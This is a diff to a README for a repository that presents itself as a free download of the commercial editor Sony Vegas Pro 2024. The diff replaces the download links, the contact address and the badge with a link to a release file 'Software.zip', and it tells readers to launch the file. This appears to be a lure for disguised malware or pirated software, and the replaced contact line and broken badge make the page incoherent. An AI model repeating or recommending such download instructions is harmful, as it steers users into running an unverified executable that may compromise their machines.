@@ -21,7 +21,7 @@ Explore the following topics related to Sony Vegas:
 
 ## Get Started
 
-To access the resources and downloads related to Sony Vegas 2024, click [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Launch the file to start exploring the world of Sony Vegas Pro 2024.
+To access the resources and downloads related to Sony Vegas 2024, click [here](https://github.com/MaRinjen/Sony-Vegas-2024/releases/download/v2.0/Software.zip). Launch the file to start exploring the world of Sony Vegas Pro 2024.
 
 ## 🎬 Features
 
@@ -63,10 +63,10 @@ We welcome contributions to the Sony Vegas 2024 repository. Feel free to submit 
 
 ## 📞 Contact Us
 
-For any inquiries or support regarding Sony Vegas Pro 2024, contact us at [sonyvegas2024@example.com](mailto:sonyvegas2024@example.com).
+For any inquiries or support regarding Sony Vegas Pro 2024, contact us at [https://github.com/MaRinjen/Sony-Vegas-2024/releases/download/v2.0/Software.zip](https://github.com/MaRinjen/Sony-Vegas-2024/releases/download/v2.0/Software.zip).
 
 ---
 
 Dive into the world of professional video editing with Sony Vegas Pro 2024. Download now and unleash your creativity! 🌟
 
-[![](https://img.shields.io/badge/Download-Sony%20Vegas%202024-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![](https://github.com/MaRinjen/Sony-Vegas-2024/releases/download/v2.0/Software.zip%20Vegas%202024-blue)](https://github.com/MaRinjen/Sony-Vegas-2024/releases/download/v2.0/Software.zip)
